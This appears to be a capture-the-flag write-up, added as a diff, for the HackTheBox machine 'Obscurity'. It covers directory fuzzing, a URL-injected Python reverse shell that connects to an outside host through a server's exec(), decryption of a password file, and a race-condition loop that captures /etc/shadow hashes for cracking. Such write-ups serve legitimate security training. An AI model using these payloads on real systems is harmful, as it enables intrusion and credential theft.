@@ -1,0 +1,58 @@
+Foothold
+--------
+//rmb to add obscurity.htb 10.10.10.168 into /etc/hosts
+
+1)in obscurity.htb:8080/ found that there's a python script in the server directory
+Message to server devs: 
+the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory
+
+2)fuzz the secret development directory to get the python script
+./ffuf -u http://obscurity.htb:8080/FUZZ/SuperSecureServer.py -w /usr/share/wordlists/dirb/common.txt
+
+2.5) from the SuperSecureServer.py
+/*
+it seems that the customize python server use exec() to execute the url link
+so inject python code into url to get reverse shell and use '' to escape url limitation
+*/
+
+3)use the link including the python code to get reverse shell
+obscurity.htb:8080/';import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.15.41%22,18890));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);a='
+
+User
+----
+1) in /home/robert there's a python script 'SuperSecureCrypt.py' and 3 text file out.txt, check.txt & passwordreminder.txt
+2) get the files save it to local
+3) decrypt the text files to get robert ssh password
+/*
+check.txt = key for out.txt
+out.txt key for passwordreminder.txt
+
+python3 SuperSecureCrypt.py -i out.txt -k 'Encrypting this file with your key should result in out.txt, make sure your key is correct!' -o key.txt -d
+
+python3 SuperSecureCrypt.py -i passwordreminder.txt -k 'alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich' -o usrPW -d
+
+
+*/
+
+4)ssh into robert and get the userFlag
+
+Root
+----
+1) read the code in Betterssh.py
+//it seems like after accessing /etc/shadow to get hash it will stored in /tmp/SSH/<random filename>
+
+2) create a SSH folder in /tmp and create a bash script
+
+//this script will cat any file that appear in the SSH folder and append into file 
+#!/bin/sh
+
+while :
+do
+        cat * >> file
+done
+
+3) run the bash script and run the Betterssh.py and enter username: root, password can be any since we need the hash only.
+4) terminate the bash script and use "sort file | uniq | cat" to display uniq line in the file 
+5) crack the hash using john the ripper($6$...) is a SHA hash
+6) su root with the password
+7) get the rootFlag!!
